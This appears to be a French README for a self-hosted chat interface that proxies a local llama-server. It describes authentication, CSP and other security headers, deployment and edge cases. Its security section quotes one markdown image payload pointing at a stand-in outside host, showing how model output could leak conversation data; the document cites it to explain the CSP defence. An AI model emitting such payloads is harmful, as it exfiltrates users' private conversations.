# llm-chat

Interface de chat pour un `llama-server` local, exposable sur le LAN ou derrière un reverse proxy.
React + Vite en front, un proxy Node sans dépendance en back.

Pensée autour de la contrainte réelle du poste : **~5,8 tok/s en génération**.
Tout ce qui compte (streaming, Stop, compteurs live, garde-fous de contexte)
existe parce qu'une réponse de 1000 tokens prend trois minutes.

```
server.js                       proxy + statique + auth, 0 dépendance
lib/auth.js                     mot de passe, sessions signées, anti brute-force
lib/security.js                 CSP et en-têtes de sécurité
lib/login.html                  page de connexion (formulaire HTML pur)
web/                            front Vite + React + Tailwind -> web/dist
launchd/com.yohan.llmchat.plist LaunchAgent prêt à l'emploi
```

## Prérequis

- Node ≥ 20 sur le Mac (`brew install node`)
- `llama-server` qui écoute déjà sur `127.0.0.1:8080`
- La clé API dans `~/.qwen38-api-key`
- Un mot de passe d'accès dans `~/.llm-chat-password` (le serveur refuse de
  démarrer sans, sauf `AUTH_DISABLED=1`)

## Installation

```bash
git clone <ce-repo> ~/llm-chat
cd ~/llm-chat
npm run setup                              # deps du front + build web/dist
printf 'mon-mot-de-passe' > ~/.llm-chat-password && chmod 600 ~/.llm-chat-password
npm start                                  # http://<ip-du-mac>:3000
```

Pour ne pas laisser le mot de passe en clair sur le disque :

```bash
npm run hash-password 'mon-mot-de-passe'   # -> scrypt$...$...
export APP_PASSWORD_HASH='scrypt$...$...'
```

## Variables d'environnement

| Variable           | Défaut                  | Rôle |
|--------------------|-------------------------|------|
| `LLM_API_KEY`      | —                       | Clé envoyée en `Authorization: Bearer`. Prioritaire. |
| `LLM_API_KEY_FILE` | `~/.qwen38-api-key`     | Fichier lu si `LLM_API_KEY` est absente. |
| `LLM_UPSTREAM`     | `http://127.0.0.1:8080` | llama-server. |
| `PORT`             | `3000`                  | |
| `HOST`             | `0.0.0.0`               | Mettre `127.0.0.1` pour couper l'accès LAN. |
| `WEB_DIR`          | `web/dist`              | Build servi. |
| `APP_PASSWORD`     | —                       | Mot de passe d'accès en clair. |
| `APP_PASSWORD_HASH`| —                       | Empreinte scrypt (`npm run hash-password`). Prioritaire. |
| `APP_PASSWORD_FILE`| `~/.llm-chat-password`  | Fichier lu si les deux précédentes sont absentes. |
| `SESSION_SECRET`   | auto                    | Clé HMAC des sessions. Générée et persistée dans `~/.llm-chat-session-secret` si absente. |
| `TRUST_PROXY`      | `0`                     | **Mettre à `1` derrière un reverse proxy** : lit `X-Forwarded-Proto` et `X-Forwarded-For`. |
| `AUTH_DISABLED`    | `0`                     | `1` désactive l'authentification. À réserver à un binding `127.0.0.1`. |
| `MAX_BODY_BYTES`   | `1000000`               | Taille max d'une requête `/api`. |

La clé n'atteint jamais le navigateur : le front appelle `/api/*`, le proxy
réinjecte l'en-tête côté Node.

## Développement

Deux process :

```bash
npm run dev:server     # node --watch server.js   (:3000, proxy + API)
npm run dev:web        # vite                     (:5173, HMR)
```

Vite renvoie `/api` vers `:3000`, donc la clé reste côté Node même en dev.
Ouvrir `http://localhost:5173`.

Build de prod : `npm run build` (sortie `web/dist`), puis `npm start`.

## Démarrage automatique (LaunchAgent)

```bash
sed -i '' "s|/Users/yohan|$HOME|g" launchd/com.yohan.llmchat.plist
cp launchd/com.yohan.llmchat.plist ~/Library/LaunchAgents/
launchctl load  ~/Library/LaunchAgents/com.yohan.llmchat.plist
launchctl list | grep llmchat
tail -f ~/Library/Logs/llm-chat.log
```

Vérifier le chemin de `node` dans le plist (`which node` — souvent
`/opt/homebrew/bin/node` sur Apple Silicon) : launchd n'hérite pas du `PATH`
du shell.

Décharger : `launchctl unload ~/Library/LaunchAgents/com.yohan.llmchat.plist`.


## Sécurité

Le service est conçu pour être joignable depuis Internet derrière un reverse
proxy TLS. Ce qui est en place :

- **Authentification par mot de passe** sur *toutes* les routes, y compris les
  fichiers statiques : sans session, on ne peut même pas télécharger le bundle.
  Session = cookie signé HMAC-SHA256, `HttpOnly`, `SameSite=Strict`, `Secure`
  dès que la requête d'origine est en HTTPS, valable 30 jours.
- **Anti brute-force** : 5 essais ratés puis blocage exponentiel par IP
  (1 min, 2, 4… plafonné à 1 h). Nécessite `TRUST_PROXY=1` derrière un proxy,
  sinon toutes les tentatives sont comptées sur l'IP du proxy et vous vous
  bloquez vous-même.
- **CSP stricte** : `default-src 'self'`, `connect-src 'self'`,
  `img-src 'self' data:`, `frame-ancestors 'none'`. C'est cette directive qui
  garantit techniquement que le contenu de vos conversations ne peut pas
  quitter le site : une réponse du modèle contenant
  `![](https://ailleurs/?fuite=...)` est bloquée par le navigateur. Vérifié :
  image, `fetch`, `<script>` et WebSocket vers un domaine tiers sont tous refusés.
- **HSTS**, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`,
  `X-Robots-Tag: noindex` et `robots.txt` interdisant l'indexation.
- **Une seule génération à la fois côté serveur** (429 sinon) et corps de
  requête plafonné : un inconnu ne peut pas saturer le Mac.
- La clé de `llama-server` et le cookie de session ne circulent jamais
  ensemble : le cookie est retiré des requêtes proxifiées, la clé n'est
  ajoutée que côté Node.

### Ce qui n'est *pas* couvert

- **Le chiffrement TLS est terminé par votre reverse proxy**, pas par ce
  service. Si c'est un tunnel géré (Cloudflare Tunnel, ngrok…), l'opérateur
  voit vos prompts en clair à cet endroit. Seul un proxy que vous hébergez
  vous-même évite ce tiers.
- **Les conversations sont stockées en clair dans le `localStorage`** du
  navigateur. Elles ne transitent nulle part, mais quiconque a accès au
  navigateur déverrouillé les lit.
- **`llama-server` journalise les prompts** selon sa configuration. Le
  fichier de log sur le Mac est un stockage en clair de tout l'historique.
- **Rien ne protège contre une faille de `llama-server` lui-même.** Vérifiez
  que le port 8080 n'est pas exposé publiquement en plus du 3000.

### Vérifications à faire depuis l'extérieur

```bash
# 1. TLS valide et redirection depuis http://
curl -sSI https://x.eviatek.fr/ | head -1
curl -sS -o /dev/null -w '%{http_code} -> %{redirect_url}\n' http://x.eviatek.fr/

# 2. Rien n'est accessible sans session (doit répondre 302 puis 401)
curl -s -o /dev/null -w '%{http_code}\n' https://x.eviatek.fr/
curl -s -o /dev/null -w '%{http_code}\n' https://x.eviatek.fr/api/health

# 3. llama-server ne doit PAS répondre depuis l'extérieur
curl -sS --max-time 5 http://x.eviatek.fr:8080/health     # doit échouer
curl -sS --max-time 5 https://x.eviatek.fr:8080/health    # doit échouer

# 4. Note de sécurité TLS
#    https://www.ssllabs.com/ssltest/analyze.html?d=x.eviatek.fr
```

## Endpoints

| Front            | Upstream                | |
|------------------|-------------------------|---|
| `/auth/login`    | —                       | formulaire HTML, POST `password` |
| `/auth/logout`   | —                       | efface le cookie |
| `/api/health`    | `/health`               | 200 prêt · 503 modèle en chargement · 502 llama-server absent |
| `/api/v1/models` | `/v1/models`            | nom du modèle au démarrage |
| `/api/v1/chat/completions` | idem          | SSE, `stream: true` |

## Choix non évidents

**Aucun timeout nulle part.** `server.requestTimeout`, `headersTimeout`,
`res.setTimeout` et le timeout upstream sont tous à 0, et le client ne pose
aucun `AbortSignal.timeout`. Le défaut Node (5 min sur `requestTimeout`)
couperait une génération longue en plein milieu.

**`accept-encoding: identity` forcé vers l'upstream.** Un flux gzippé est
bufferisé par le compresseur, ce qui annule le streaming token par token.

**L'abort client détruit la requête upstream.** Sans ça, le bouton Stop
libère l'UI mais laisse llama-server générer dans le vide — sur un serveur
`--parallel 1`, le message suivant attendrait la fin de la réponse annulée.

**Le texte en cours de stream ne vit pas dans le store persisté.** Recopier
tout l'arbre de conversations et le resérialiser en localStorage à chaque
token coûterait plus cher que la génération elle-même. Le texte est commité
dans la conversation à la fin du flux (ou à l'abort, ou à l'erreur).

**Le compteur de contexte est une estimation.** Le seul tokenizer exact est
dans llama-server, et `/tokenize` ferait la queue derrière la génération sur
un serveur `--parallel 1`. On part d'un ratio caractères/token, recalibré à
chaque tour sur les `prompt_tokens` réellement renvoyés par le serveur.

**« Continuer » n'est pas une vraie continuation.** L'endpoint chat referme
toujours le tour assistant. On envoie donc une instruction utilisateur
jetable (non persistée) et on concatène le texte reçu au message existant.
Marche bien en pratique, mais le modèle peut répéter une phrase à la jointure.

## Cas limites gérés

- **Modèle en chargement** (~2 min après reboot) : `/api/health` renvoie 503,
  bandeau explicite, poll à 3 s au lieu de 15 s, et un envoi parti trop tôt
  attend la disponibilité (jusqu'à 5 min) puis repart tout seul.
- **`finish_reason: "length"`** : badge « réponse tronquée » + bouton Continuer.
- **Coupure réseau en plein stream** : le partiel est conservé et marqué
  interrompu, avec Continuer / Régénérer.
- **Dépassement de contexte** : la jauge passe en orange à 80 %, et si
  `prompt + max_tokens > 8192` l'envoi demande une confirmation explicite —
  le serveur tronquerait silencieusement.
- **Envoi concurrent** : bloqué pendant une génération (`--parallel 1`).

## Limites connues

- Rafraîchir la page en plein streaming perd la réponse en cours (rien n'est
  persisté avant la fin du flux). La requête upstream, elle, est bien annulée.
- L'estimation de tokens dérive sur du texte très inhabituel (base64, CJK)
  tant que le premier tour n'a pas recalibré le ratio.
- `localStorage` est par appareil : les conversations ouvertes sur l'iPhone ne
  sont pas celles du PC. Il n'y a pas de base de données, c'était le cahier
  des charges.
- Un seul mot de passe partagé, pas de comptes ni de 2FA. Suffisant pour un
  outil personnel, insuffisant si vous ouvrez l'accès à d'autres personnes.
- Les sessions ne sont pas révocables individuellement : pour déconnecter tous
  les appareils, supprimez `~/.llm-chat-session-secret` et redémarrez.
- Le blocage anti brute-force est en mémoire : un redémarrage le remet à zéro.
